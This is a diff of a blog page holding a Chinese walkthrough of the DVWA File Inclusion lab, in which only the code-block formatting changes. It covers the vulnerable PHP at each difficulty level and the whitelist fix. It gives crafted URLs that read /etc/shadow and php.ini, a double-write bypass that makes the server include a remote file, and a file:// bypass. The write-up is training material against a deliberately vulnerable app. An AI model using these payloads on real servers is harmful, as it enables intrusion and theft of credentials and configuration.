@@ -164,13 +164,8 @@
 
   <div class="content" itemprop="articleBody">
     <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br><img src="/2019/04/17/dvwa-zhi-file-inclusion/FI1.jpg" alt=""></p>
-<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre><code>&lt;?php
-
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
-
-?&gt; 
-</code></pre><p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
 <p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
 <p>点击<code>file1.php</code>后，显示如下:<br><img src="/2019/04/17/dvwa-zhi-file-inclusion/FI2.jpg" alt=""><br>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>构造url：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
@@ -178,51 +173,18 @@ $file = $_GET[ &#39;page&#39; ];
 <p>构造url（绝对路径）：<br><a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini</a><br><img src="/2019/04/17/dvwa-zhi-file-inclusion/FI4.jpg" alt=""><br>成功读取了服务器的php.ini文件</p>
 <p>构造url（相对路径）：<br>。。。。。。待续</p>
 <h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
-<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h2><pre><code>&lt;?php
-
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
-
-// Input validation
-$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
-$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
-
-?&gt; 
-</code></pre><p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
+<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
 <h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用<code>str_replace</code>函数是极其不安全的，因为可以使用双写绕过替换规则。<br>例如<code>page=hthttp://tp://192.168.5.12/phpinfo.txt</code>时，<code>str_replace</code>函数会将<code>http://</code>删除，于是<code>page=http://192.168.5.12/phpinfo.txt</code>，成功执行远程命令。</p>
 <p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
 <p><strong>本地文件包含</strong><br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p>
 <p><strong>远程文件包含</strong></p>
 <p><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p>
-<h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h2 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h2><pre><code>&lt;?php
-
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
-
-// Input validation
-if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
-    // This isn&#39;t the page we want!
-    echo &quot;ERROR: File not found!&quot;;
-    exit;
-}
-
-?&gt; 
-</code></pre><p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h2 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&apos;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
 <h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。<br><img src="/2019/04/17/dvwa-zhi-file-inclusion/FI5.jpg" alt=""><br>构造url：<br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
-<h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><h2 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h2><pre><code>&lt;?php
-
-// The page we wish to display
-$file = $_GET[ &#39;page&#39; ];
-
-// Only allow include.php or file{1..3}.php
-if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {
-    // This isn&#39;t the page we want!
-    echo &quot;ERROR: File not found!&quot;;
-    exit;
-}
-
-?&gt; 
-</code></pre><p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
+<h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><h2 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">    // This isn&apos;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
 
   </div>
 </article>
